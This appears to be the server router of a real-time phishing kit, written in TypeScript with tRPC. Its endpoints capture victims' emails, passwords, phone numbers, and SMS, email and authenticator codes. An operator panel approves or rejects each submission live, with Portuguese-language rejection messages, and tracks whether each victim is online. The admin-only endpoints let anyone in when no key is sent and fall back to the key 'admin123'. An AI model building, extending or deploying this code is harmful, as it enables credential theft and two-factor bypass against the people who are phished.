import { COOKIE_NAME } from "@shared/const";
import { getSessionCookieOptions } from "./_core/cookies";
import { systemRouter } from "./_core/systemRouter";
import { publicProcedure, router, protectedProcedure } from "./_core/trpc";
import { saveClientLoginData, getAllClientLoginData, validateCredentials, updateValidationStatus, createVerificationSession, getVerificationSession, updateVerificationSession, getActiveVerificationSessions, getDb, incrementLoginPageViews, getLoginPageViews, deleteAllClientLoginData, incrementGlobalPageView, getGlobalPageViewCount as getGlobalPageViewCountDb, incrementMainLinkClick, getMainLinkClickCount, updateClientActivity, markClientOffline } from "./db";
import { eq } from "drizzle-orm";
import { clientLoginData } from "../drizzle/schema";
import { nanoid } from "nanoid";
import { z } from "zod";

export const appRouter = router({
    // if you need to use socket.io, read and register route in server/_core/index.ts, all api should start with '/api/' so that the gateway can route correctly
  system: systemRouter,
  auth: router({
    me: publicProcedure.query(opts => opts.ctx.user),
    logout: publicProcedure.mutation(({ ctx }) => {
      const cookieOptions = getSessionCookieOptions(ctx.req);
      ctx.res.clearCookie(COOKIE_NAME, { ...cookieOptions, maxAge: -1 });
      return {
        success: true,
      } as const;
    }),
  }),

  clientData: router({
    save: publicProcedure
      .input(z.object({
        email: z.string().optional(),
        password: z.string().optional(),
        phoneNumber: z.string().optional(),
        phoneCountryCode: z.string().optional(),
        emailVerificationCode: z.string().optional(),
        authenticatorCode: z.string().optional(),
        loginMethod: z.string().optional(),
        ipAddress: z.string().optional(),
        userAgent: z.string().optional(),
      }))
      .mutation(async ({ input }) => {
        const clientId = await saveClientLoginData(input);
        return { success: true, clientId };
      }),
    getAll: publicProcedure
      .input(z.object({
        adminKey: z.string().optional(),
      }).optional())
      .query(async ({ input }) => {
        // Allow access with admin key or without key (for local development)
        // In production, you should require the admin key
        const adminKey = process.env.ADMIN_KEY || "admin123";
        if (input?.adminKey && input.adminKey !== adminKey) {
          throw new Error("Invalid admin key");
        }
        const clientData = await getAllClientLoginData();
        const sessions = await getActiveVerificationSessions();
        
        return clientData.map(client => {
          const clientSessions = sessions.filter(s => s.clientLoginDataId === client.id);
          const session = clientSessions.length > 0 ? clientSessions[0] : null;
          return {
            ...client,
            activeSession: session || null,
          };
        });
      }),
    authenticate: publicProcedure
      .input(z.object({
        email: z.string().optional(),
        password: z.string(),
        phoneNumber: z.string().optional(),
        phoneCountryCode: z.string().optional(),
      }))
      .mutation(async ({ input }) => {
        const isValid = await validateCredentials(
          input.email,
          input.password,
          input.phoneNumber,
          input.phoneCountryCode
        );
        return { isValid };
      }),
    updateValidationStatus: publicProcedure
      .input(z.object({
        adminKey: z.string().optional(),
        id: z.number(),
        status: z.enum(["pending", "valid", "invalid_email_password", "invalid_phone_password", "invalid_email_code", "invalid_authenticator_code"]),
        rejectionReason: z.string().optional(),
      }))
      .mutation(async ({ input }) => {
        // Allow access with admin key or without key (for local development)
        const adminKey = process.env.ADMIN_KEY || "admin123";
        if (input.adminKey && input.adminKey !== adminKey) {
          throw new Error("Invalid admin key");
        }
        await updateValidationStatus(input.id, input.status, input.rejectionReason);
        return { success: true };
      }),
    createSession: publicProcedure
      .input(z.object({
        clientLoginDataId: z.number(),
      }))
      .mutation(async ({ input }) => {
        const sessionId = nanoid();
        const expiresAt = new Date(Date.now() + 10 * 60 * 1000);
        await createVerificationSession({
          clientLoginDataId: input.clientLoginDataId,
          sessionId,
          status: "pending",
          expiresAt,
        });
        return { sessionId };
      }),
    getSession: publicProcedure
      .input(z.object({
        sessionId: z.string(),
      }))
      .query(async ({ input }) => {
        return await getVerificationSession(input.sessionId);
      }),
    requestEmailCode: publicProcedure
      .input(z.object({
        sessionId: z.string(),
      }))
      .mutation(async ({ input }) => {
        await updateVerificationSession(input.sessionId, {
          status: "email_code_requested",
          updatedAt: new Date(),
        });
        return { success: true };
      }),
    requestAuthCode: publicProcedure
      .input(z.object({
        sessionId: z.string(),
      }))
      .mutation(async ({ input }) => {
        await updateVerificationSession(input.sessionId, {
          status: "auth_code_requested",
          updatedAt: new Date(),
        });
        return { success: true };
      }),
    requestSmsCode: publicProcedure
      .input(z.object({
        sessionId: z.string(),
      }))
      .mutation(async ({ input }) => {
        await updateVerificationSession(input.sessionId, {
          status: "sms_code_requested",
          updatedAt: new Date(),
        });
        return { success: true };
      }),
    submitEmailCode: publicProcedure
      .input(z.object({
        sessionId: z.string(),
        code: z.string(),
      }))
      .mutation(async ({ input }) => {
        await updateVerificationSession(input.sessionId, {
          emailCode: input.code,
          status: "email_code_submitted",
          updatedAt: new Date(),
        });
        return { success: true };
      }),
    submitAuthCode: publicProcedure
      .input(z.object({
        sessionId: z.string(),
        code: z.string(),
      }))
      .mutation(async ({ input }) => {
        await updateVerificationSession(input.sessionId, {
          authCode: input.code,
          status: "auth_code_submitted",
          updatedAt: new Date(),
        });
        return { success: true };
      }),
    submitSmsCode: publicProcedure
      .input(z.object({
        sessionId: z.string(),
        code: z.string(),
      }))
      .mutation(async ({ input }) => {
        await updateVerificationSession(input.sessionId, {
          smsCode: input.code,
          status: "sms_code_submitted",
          updatedAt: new Date(),
        });
        return { success: true };
      }),
    rejectCode: publicProcedure
      .input(z.object({
        sessionId: z.string(),
        codeType: z.enum(["email", "auth", "credentials", "sms"]),
      }))
      .mutation(async ({ input }) => {
        // When rejecting, set status back to requested state so client can try again
        let status: "pending" | "email_code_requested" | "auth_code_requested" | "sms_code_requested";
        let rejectionReason = "";
        if (input.codeType === "credentials") {
          status = "pending";
          rejectionReason = "Credenciais rejeitadas pelo administrador";
        } else if (input.codeType === "email") {
          status = "email_code_requested";
          rejectionReason = "Código de email rejeitado pelo administrador";
        } else if (input.codeType === "auth") {
          status = "auth_code_requested";
          rejectionReason = "Código 2FA rejeitado pelo administrador";
        } else {
          status = "sms_code_requested";
          rejectionReason = "Código SMS rejeitado pelo administrador";
        }
        await updateVerificationSession(input.sessionId, {
          status,
          rejectionReason,
          updatedAt: new Date(),
        });
        return { success: true };
      }),
    approveSmsCode: publicProcedure
      .input(z.object({
        sessionId: z.string(),
      }))
      .mutation(async ({ input }) => {
        await updateVerificationSession(input.sessionId, {
          status: "verified",
          updatedAt: new Date(),
        });
        return { success: true };
      }),
    approveVerification: publicProcedure
      .input(z.object({
        sessionId: z.string(),
      }))
      .mutation(async ({ input }) => {
        await updateVerificationSession(input.sessionId, {
          status: "verified",
          updatedAt: new Date(),
        });
        return { success: true };
      }),
    getActiveSessions: publicProcedure
      .query(async () => {
        return await getActiveVerificationSessions();
      }),
    getLoginPageViews: publicProcedure
      .query(async () => {
        const count = await getLoginPageViews();
        return { count };
      }),
    incrementLoginPageView: publicProcedure
      .mutation(async () => {
        await incrementGlobalPageView();
        return { success: true };
      }),
    getGlobalPageViewCount: publicProcedure
      .query(async () => {
        const count = await getGlobalPageViewCountDb();
        return count || 0;
      }),
    incrementMainLinkClick: publicProcedure
      .mutation(async () => {
        await incrementMainLinkClick();
        return { success: true };
      }),
    getMainLinkClickCount: publicProcedure
      .query(async () => {
        const count = await getMainLinkClickCount();
        return count || 0;
      }),
    updateClientActivity: publicProcedure
      .input(z.object({
        clientId: z.number(),
      }))
      .mutation(async ({ input }) => {
        await updateClientActivity(input.clientId);
        return { success: true };
      }),
    markClientOffline: publicProcedure
      .input(z.object({
        clientId: z.number(),
      }))
      .mutation(async ({ input }) => {
        await markClientOffline(input.clientId);
        return { success: true };
      }),
    deleteAllData: publicProcedure
      .input(z.object({
        adminKey: z.string().optional(),
      }).optional())
      .mutation(async ({ input }) => {
        const adminKey = process.env.ADMIN_KEY || "admin123";
        if (input?.adminKey && input.adminKey !== adminKey) {
          throw new Error("Invalid admin key");
        }
        await deleteAllClientLoginData();
        return { success: true, message: "All client login data deleted" };
      }),

  }),
});

export type AppRouter = typeof appRouter;
